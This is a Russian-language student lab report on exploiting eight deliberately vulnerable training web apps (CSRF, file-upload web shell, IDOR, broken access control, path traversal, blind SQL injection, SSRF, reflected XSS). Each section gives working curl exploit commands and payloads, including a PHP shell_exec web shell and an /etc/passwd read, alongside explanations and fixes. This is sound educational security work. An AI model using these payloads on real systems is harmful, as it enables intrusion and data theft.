# Лабораторная работа №2. Анализ и эксплуатация веб-уязвимостей

**ФИО:** заполнить  
**Группа:** заполнить  
**Дата выполнения:** 12.05.2026  
**Формат:** вариант А — эксплуатация учебных стендов через HTTP  

## Исходные данные

В лабораторной работе №1 был выбран учебный проект:

<https://github.com/vulnerable-apps/vuln_django_play>

Лабораторная работа №2 выполнялась не на этом проекте, а на отдельной VM с набором учебных стендов `vulnerable-code-snippets`:

| # | Стенд | Адрес | Класс |
|---|---|---|---|
| 1 | `csrf-change-email` | `http://10.0.0.40:1331` | CSRF |
| 2 | `file-upload-extension-blacklist` | `http://10.0.0.40:1332` | File Upload / RCE |
| 3 | `idor-basic-role` | `http://10.0.0.40:1333` | IDOR |
| 4 | `idor-invalid-if-statement` | `http://10.0.0.40:1334` | Broken Access Control |
| 5 | `pathTraversal-improper-regex` | `http://10.0.0.40:1335` | Path Traversal |
| 6 | `sqli-blind-variable-mixup` | `http://10.0.0.40:1336` | SQL Injection |
| 7 | `ssrf-regex-bypass` | `http://10.0.0.40:1337` | SSRF |
| 8 | `xss-christmas` | `http://10.0.0.40:1338` | Reflected XSS |

Стенды были доступны через WireGuard VPN. Реальные пароли, токены и ключи VPN в отчёт не включаются.

## 1. `csrf-change-email`

**Класс:** CSRF, OWASP A06:2025 Insecure Design, CWE-352.

**Что найдено в коде:** PHP-обработчик меняет email, если cookie `session` совпадает с серверным значением. Новый email берётся из `$_POST["email"]`. Проверяются формат email и cookie, но нет CSRF-токена.

Фрагмент уязвимой логики:

```php
if ($_SESSION["session"] == $_COOKIE["session"]) {
    if (preg_match('/^[A-Za-z0-9_@\-\.]+$/', $_POST["email"])) {
        $email = $_POST["email"];
    }
    EditUser("email", $email);
}
```

**Эксплуатация:**

```bash
curl -i -b 'session=123456' \
  -d 'email=attacker@example.test' \
  http://10.0.0.40:1331/
```

**Результат:** сервер вернул `HTTP/1.1 200 OK` и строку `Email changed`.

Для демонстрации именно CSRF используется отдельная HTML-страница:

```html
<form id="csrf" action="http://10.0.0.40:1331/" method="POST">
  <input type="hidden" name="email" value="attacker@example.test">
</form>
<script>document.getElementById("csrf").submit();</script>
```

**Почему сработало:** браузер автоматически прикладывает cookie к запросу на целевой домен. Сервер проверяет только наличие авторизующей cookie, но не проверяет намерение пользователя выполнить действие.

**Исправление:** добавить CSRF-токен, связанный с сессией, и проверять его для всех state-changing POST-запросов. Дополнительно выставить cookie `SameSite=Lax/Strict`, `HttpOnly`, `Secure`.

## 2. `file-upload-extension-blacklist`

**Класс:** Unrestricted File Upload -> RCE, OWASP A02:2025 Security Misconfiguration, CWE-434.

**Что найдено в коде:** приложение принимает файл из поля `filedoc`, берёт расширение и сравнивает его с blacklist:

```php
$target_dir = "uploads/";
$blacklist_ext = ["php", "php4", "php5", "phtm", "phtml", "phar"];
$ext = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (in_array($ext, $blacklist_ext)) {
    echo "You got caught!";
    die();
}

move_uploaded_file($_FILES["filedoc"]["tmp_name"], $target_file);
```

**Эксплуатационная команда:**

```bash
curl -i \
  -F 'filedoc=@lab2/payloads/upload-shell.php3' \
  -F 'submit=Upload' \
  http://10.0.0.40:1332/
```

Payload `upload-shell.php3`:

```php
<?php
echo "RCE_OK\n";
echo shell_exec($_GET["cmd"] ?? "id");
?>
```

Ожидаемый второй шаг после успешной загрузки:

```bash
curl -i 'http://10.0.0.40:1332/uploads/upload-shell.php3?cmd=id'
```

**Фактический результат на стенде:** blacklist был обойдён расширением `.php3`, но текущая конфигурация стенда вернула ошибку окружения:

```text
move_uploaded_file(uploads/upload-shell.php3): Failed to open stream: No such file or directory
Unable to move ... to "uploads/upload-shell.php3"
```

То есть уязвимая проверка расширения подтверждена кодом и payload'ом, но финальный RCE-шаг на текущем запуске не завершился из-за отсутствующей директории `uploads/`, а не из-за защиты blacklist.

**Почему защита плохая:** blacklist не может перечислить все опасные расширения и зависит от настроек Apache/PHP. Если `.php3` обрабатывается как PHP, файл становится web shell.

**Исправление:** использовать allowlist безопасных расширений, проверять MIME и сигнатуру содержимого, генерировать имя файла на сервере, хранить upload вне исполняемого web root и отключить выполнение скриптов в директории загрузок.

## 3. `idor-basic-role`

**Класс:** Broken Access Control / IDOR, OWASP A01:2025, CWE-639/CWE-602.

**Что найдено в коде:** Flask-приложение читает cookie `userdata`, декодирует Base64 JSON и доверяет полю `role`.

```python
userDataBase64 = request.cookies.get('userdata')
userDataJSON = base64.b64decode(userDataBase64)
userData = json.loads(userDataJSON)

if userData.get('role') == 'admin':
    return render_template('index.html', result='Admin dashboard')
```

**Эксплуатация:**

```bash
curl -i \
  -b 'userdata=eyJyb2xlIjoiYWRtaW4ifQ==' \
  http://10.0.0.40:1333/
```

`eyJyb2xlIjoiYWRtaW4ifQ==` — это Base64 от `{"role":"admin"}`.

**Результат:** ответ содержит:

```html
<h2> Admin dashboard </h2>
```

**Почему сработало:** Base64 не защищает целостность данных. Клиент может сам создать cookie с ролью `admin`.

**Исправление:** не хранить авторитетные роли в клиентской cookie. Использовать server-side session или подписанный токен и обязательно выполнять серверную проверку прав.

## 4. `idor-invalid-if-statement`

**Класс:** Broken Access Control, OWASP A01:2025, CWE-697/CWE-285.

**Что найдено в коде:** доступ к `details/{id}.json` должен быть только у администратора, но условие написано через `&&`:

```php
if ($sess != '...' && $user != 'tom') {
    echo "You are not authorized to view this content.";
    return;
}
readfile("details/$id.json");
```

Фактические входные данные берутся не из GET-параметров, а из cookie:

```php
$id = intval($_COOKIE['id']);
$sess = preg_replace('/[^a-zA-Z0-9]/i', '', $_COOKIE['usess']);
$user = preg_replace('/[^a-zA-Z0-9]/i', '', $_COOKIE['user']);
```

**Эксплуатация:**

```bash
curl -i \
  -b 'user=tom; usess=anything; id=1337' \
  'http://10.0.0.40:1334/?details'

curl -i \
  -b 'user=tom; usess=anything; id=4242' \
  'http://10.0.0.40:1334/?details'
```

**Результат:** для `id=1337` и `id=4242` сервер вернул JSON-карточки пользователей. В публичной версии отчёта значения сессионных и CSRF-полей не приводятся, но факт чтения подтверждён наличием полей `id`, `role`, `email`, `phone`, `session`, `csrf`, `bio`.

**Почему сработало:** проверка запрещает доступ только когда одновременно неверны и сессия, и пользователь. Если поставить `user=tom`, выражение становится false даже при неверной сессии.

**Исправление:**

```php
if ($sess !== ADMIN_SESSION || $user !== 'tom') {
    http_response_code(403);
    exit('Forbidden');
}
```

Лучше вынести авторизацию в middleware/RBAC-policy.

## 5. `pathTraversal-improper-regex`

**Класс:** Path Traversal, OWASP A01:2025, CWE-22.

**Что найдено в коде:** приложение берёт `$_GET['file']`, удаляет `://`, `\` и все `../`, после чего читает файл:

```php
function PathFilter($s) {
    $s = preg_replace("/(:\/\/)|\\\\/", "", $s);
    while (str_contains($s, "../")) {
        $s = str_replace("../", "", $s);
    }
    return $s;
}

$file = htmlspecialchars(PathFilter($_GET['file']));
$content = file_get_contents($file);
```

**Эксплуатация:**

```bash
curl -i 'http://10.0.0.40:1335/?file=/etc/passwd'
```

**Результат:** в ответе выведен `/etc/passwd`, включая строки:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**Почему сработало:** абсолютный путь `/etc/passwd` не содержит `../`, поэтому фильтр его не меняет. Проблема в том, что код фильтрует строку, а не проверяет канонический путь внутри разрешённой директории.

**Исправление:** использовать `realpath()` и проверять, что итоговый путь находится внутри allowlisted base directory.

```php
$base = realpath(__DIR__ . '/files');
$candidate = realpath($base . '/' . $_GET['file']);

if ($candidate === false || strncmp($candidate, $base . DIRECTORY_SEPARATOR, strlen($base) + 1) !== 0) {
    http_response_code(403);
    exit('Forbidden');
}

echo file_get_contents($candidate);
```

## 6. `sqli-blind-variable-mixup`

**Класс:** SQL Injection, OWASP A05:2025, CWE-89.

**Что найдено в коде:** `id` и `stock` приводятся через `intval`, `color` экранируется, но экранированное значение кладётся в массив, а в SQL попадает исходный `$color`.

```php
$color = $_GET["color"];

$lst = array(
    $id => $id,
    $stock => $stock,
    $color => $mysqlDB->real_escape_string($color)
);

$result = mysqli_query(
    $mysqlDB,
    "SELECT * FROM `products` WHERE color = '$color' AND (id > $id AND stock > $stock)"
);
```

**Подтверждение инъекции:**

```bash
curl -i -G http://10.0.0.40:1336/ \
  --data-urlencode 'id=0' \
  --data-urlencode 'stock=0' \
  --data-urlencode "color=' OR 1=1 -- -"
```

Результат:

```html
<p>Search result: 10 exist with color: &#039; OR 1=1 -- -</p>
```

Контрольный ложный запрос:

```bash
curl -i -G http://10.0.0.40:1336/ \
  --data-urlencode 'id=0' \
  --data-urlencode 'stock=0' \
  --data-urlencode "color=' OR 1=2 -- -"
```

Результат:

```html
<p>Search result: OUT OF STOCK</p>
```

**Blind-извлечение данных из `users`:**

```bash
python3 lab2/payloads/sqli_blind_redacted.py
```

Результат:

```text
username=Mario
password_length=9
password_value=<redacted>
```

**Почему сработало:** экранирование было применено не к той переменной, а SQL-запрос собирается конкатенацией строк.

**Исправление:** использовать prepared statements:

```php
$stmt = $mysqli->prepare(
    'SELECT * FROM products WHERE color = ? AND (id > ? AND stock > ?)'
);
$stmt->bind_param('sii', $color, $id, $stock);
$stmt->execute();
```

## 7. `ssrf-regex-bypass`

**Класс:** SSRF, CWE-918. В OWASP Top 10:2025 SSRF не выделен отдельной категорией, но остаётся важной web-уязвимостью.

**Что найдено в коде:** приложение принимает URL картинки в `image`, запрещает только строки `localhost` и `127.0.0.1`, затем выполняет `requests.get(url)`.

```python
lst_proto = ['http', 'https']
lst_local = ['localhost', '127.0.0.1']

protocol = re.search(r'^(.*?)://', url).group(1)
URLCheck = re.search(r'^.*://(.*?)(:|/)', url).group(1)

if (URLCheck in lst_local) and (protocol in lst_proto):
    return b""

res = requests.get(url)
```

**Эксплуатация:**

```bash
curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://127.1:1337/'
```

**Результат:** сервер вернул `HTTP/1.1 200 OK` и вставил в HTML `<img src="data:image/jpg;base64,...">`, где base64 содержит ответ локального HTTP-сервиса. Это доказывает, что backend сделал запрос к loopback-адресу, хотя `127.0.0.1` был в blacklist.

Дополнительная проверка:

```bash
curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://127.1:1333/'
```

Результат: приложение попыталось выполнить запрос к `127.1:1333` и вернуло traceback `Connection refused`, что также подтверждает SSRF-попытку к loopback.

**Почему сработало:** `127.1` является альтернативной записью loopback, но строково не равно `127.0.0.1`.

**Исправление:** использовать allowlist разрешённых доменов, резолвить hostname в IP, запрещать private/link-local/loopback диапазоны, повторно проверять адрес после редиректов и ограничивать egress на уровне сети.

## 8. `xss-christmas`

**Класс:** Reflected XSS / Type Confusion, OWASP A05:2025, CWE-79/CWE-843.

**Что найдено в коде:** форма отправляет `childName` и `letterContent` на `/send-letter`. Строковое значение с `<` и `>` блокируется, но `bodyParser.urlencoded({ extended: true })` позволяет отправить массив `letterContent[]`.

Проблема: для массива `includes("<")` проверяет наличие элемента `<`, а не символа внутри строки. После проверки массив приводится к строке и вставляется в HTML.

**Эксплуатация:**

```bash
curl -i -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'childName=Alice' \
  --data-urlencode 'letterContent[]=<img src=x onerror=alert(document.domain)>' \
  http://10.0.0.40:1338/send-letter
```

**Результат:** сервер вернул:

```html
<p><strong><img src=x onerror=alert(document.domain)></strong></p>
```

Контрольный запрос со строкой:

```bash
curl -i -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'childName=Alice' \
  --data-urlencode 'letterContent=<img src=x onerror=alert(document.domain)>' \
  http://10.0.0.40:1338/send-letter
```

Результат:

```html
<title>Error - Invalid Characters</title>
<p>Your letter contains invalid characters. Please try again!</p>
```

**Почему сработало:** защита написана для строки, но принимает массив. Потом значение вставляется в HTML без контекстного экранирования.

**Исправление:** строго проверять тип входных данных и экранировать HTML-контекст:

```js
if (typeof letterContent !== 'string') {
  return res.status(400).send('Invalid input');
}

const safeLetter = escapeHtml(letterContent);
```

Дополнительно: CSP, Trusted Types и запрет небезопасной вставки HTML.

## Итог по выполнению

Практически подтверждены 7 из 8 стендов живыми ответами сервера:

1. CSRF — POST с авторизующей cookie меняет email.
2. IDOR basic role — поддельная cookie открывает `Admin dashboard`.
3. Invalid If — cookie `user=tom` позволяет читать чужие JSON-карточки.
4. Path Traversal — `/etc/passwd` выводится в ответе.
5. SQLi — true/false conditions меняют ответ; blind-скрипт извлекает данные из `users`.
6. SSRF — `127.1` проходит blacklist и заставляет backend обратиться к loopback.
7. XSS — `letterContent[]` обходит фильтр и вставляет выполняемый HTML/JS.

По стенду File Upload уязвимость подтверждена в коде и payload'ом обхода blacklist, но финальный RCE-шаг на текущем запуске стенда заблокирован ошибкой окружения: отсутствует директория `uploads/`.

## Как защищать работу устно

Короткий план рассказа:

1. Сначала сказать, что лабораторная №2 выполнялась на специальных учебных стендах `vulnerable-code-snippets`, а выбранный в lab1 проект `vuln_django_play` остаётся контекстом первой лабораторной.
2. Показать, что VPN поднят и стенды открываются по `10.0.0.40:1331-1338`.
3. Объяснять каждый стенд по схеме: входные данные -> ошибочная проверка -> dangerous sink -> payload -> правильный fix.
4. Не говорить “плохо написали”, а объяснять механику:
   - CSRF: браузер сам отправляет cookie, сервер не проверяет намерение пользователя.
   - File Upload: blacklist расширений неполон, `.php3` не заблокирован.
   - IDOR: клиентская cookie не является источником прав.
   - Invalid If: нужен `||`, а не `&&`.
   - Path Traversal: фильтрация строк не заменяет `realpath()`.
   - SQLi: экранированная копия не используется, нужен prepared statement.
   - SSRF: blacklist хостов обходится альтернативными формами loopback.
   - XSS: `Array.includes` и `String.includes` работают по-разному.
5. В конце сказать общий вывод: надёжная защита строится на server-side authorization, allowlist, канонизации, prepared statements, строгой типизации и контекстном экранировании.
